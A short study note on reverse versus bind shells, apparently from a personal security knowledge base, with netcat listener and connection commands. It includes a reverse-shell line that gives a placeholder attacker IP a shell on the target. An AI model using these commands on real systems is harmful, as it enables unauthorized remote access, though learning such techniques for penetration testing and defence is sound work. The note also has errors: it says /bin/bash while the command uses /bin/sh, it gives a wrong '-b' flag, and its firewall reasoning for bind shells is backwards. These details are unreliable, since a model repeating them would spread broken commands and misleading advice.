# Reverse Shells vs. Bind Shells
Shells are just a way to gain and maintain access to a target machine. The most common type of shell is a [reverse shell](/cybersecurity/TTPs/exploitation/rev-shell.md) in which the victim machine connects back to us. A common tool used to accomplish rev-shells is *[Netcat](/cybersecurity/tools/exploitation/netcat.md)*.
## Rev Shells
In order for rev shells to work, the attacking device needs to be listening on a specific port for the connection. In Netcat we can tell our device to listen on a chosen port with the command: `nc -lvp 4444`.
- `-l` for listen
- `-v` for verbose
- `-p` for port
With this command, we're telling Netcat to listen on port 4444 of our machine.
### On the target:
To get the target to connect to our listener, we have to send execute a command on the target to make the connection. For example: if the target *has netcat installed* (or we've some how gotten netcat onto the target machine) we can use it to make a connection back to our machine.

The command on the target in this case would look something like this:
```bash
nc <attacking IP> 4444 -e /bin/sh
```
In this command, nc on the target device creates a *[TCP connection](/networking/protocols/TCP.md)* back to the attacking IP, and executing a shell (`/bin/bash`) using the `-e` flag (the shell is executed on the target device).
## Bind Shells
[Bind shells](/cybersecurity/TTPs/exploitation/bind-shell.md) are essentially *the reverse of rev shells.* In bind shells, we *open a port on the target for listening* and make the TCP connection to that address from the attacker.

The shell execution *is still from the target's device*:
```bash
# Attacking command (example)
nc <target IP> 4444
# Target command (ex)
nc -lvp 4444 -b /bin/bash
```
Bind shells are more commonly used during *external pen-tests* b/c it's easier to make the connection to the target (due to firewalls and other factors complicating external network access).
